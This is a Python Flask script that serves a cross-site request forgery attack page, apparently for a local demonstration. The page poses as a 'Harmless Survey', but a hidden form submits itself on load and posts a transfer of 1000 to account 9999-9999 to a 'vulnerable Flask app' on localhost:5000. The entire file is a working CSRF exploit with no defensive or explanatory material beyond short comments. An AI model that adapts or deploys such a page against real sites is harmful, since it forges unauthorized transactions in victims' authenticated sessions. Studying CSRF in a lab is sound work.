from flask import Flask, render_template_string

app = Flask(__name__)

# Inline HTML Template for the malicious page
MALICIOUS_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Harmless Survey</title>
</head>
<body>
    <h1>This Could Be a Harmless Survey</h1>
    <!-- This form will automatically post to the vulnerable Flask app -->
    <form id="fakeForm" action="http://localhost:5000/transfer" method="POST">
        <input type="hidden" name="amount" value="1000">
        <input type="hidden" name="to_account" value="9999-9999">
    </form>
    <script>
        // JavaScript to automatically send a POST request
        window.onload = function() {
            document.getElementById('fakeForm').submit();
        }
    </script>
</body>
</html>
"""

@app.route('/')
def malicious():
    # Render the malicious HTML directly
    return render_template_string(MALICIOUS_HTML)

if __name__ == '__main__':
    app.run(port=5001, debug=True)
